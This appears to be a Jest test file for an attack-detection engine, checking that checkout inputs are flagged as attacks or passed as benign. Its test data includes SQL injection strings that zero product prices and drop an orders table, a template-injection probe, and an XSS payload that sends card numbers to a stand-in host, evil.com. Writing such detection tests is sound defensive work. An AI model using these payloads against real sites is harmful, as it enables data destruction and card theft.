'use strict';
const { DetectionEngine } = require('../../src/index');

describe('Scenario: Payment and Checkout Attacks', () => {
  let engine;
  beforeEach(() => {
    engine = new DetectionEngine();
  });

  const runPayload = (payload) => engine.detect(payload);

  it('detects SQLi in coupon lookup', () => {
    const result = runPayload("' OR 1=1--");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects Stacked query in coupon', () => {
    const result = runPayload("SAVE50'; UPDATE products SET price=0;--");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects XSS to steal card data', () => {
    const result = runPayload("<script>new Image().src='http://evil.com/?cc='+document.getElementById('cc-number').value</script>");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects SQLi in address', () => {
    const result = runPayload("123 Main St'; DROP TABLE orders;--");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects Template injection in coupon', () => {
    const result = runPayload("${100*0.5}");
    expect(result.confidence).toBeGreaterThanOrEqual(0.3);
  });

  it('allows benign coupon code', () => {
    const result = runPayload("SUMMER2026");
    expect(result.label).toBe('benign');
  });

  it('allows benign name', () => {
    const result = runPayload("John A. Smith III");
    expect(result.label).toBe('benign');
  });

  it('allows benign address', () => {
    const result = runPayload("742 Evergreen Terrace, Springfield, IL 62704");
    expect(result.label).toBe('benign');
  });

  it('allows benign order note', () => {
    const result = runPayload("Please leave at the front door. Thanks!");
    expect(result.label).toBe('benign');
  });

  it('allows benign order', () => {
    const result = runPayload('{"productId":"prod_123","quantity":2}');
    expect(result.label).toBe('benign');
  });
});
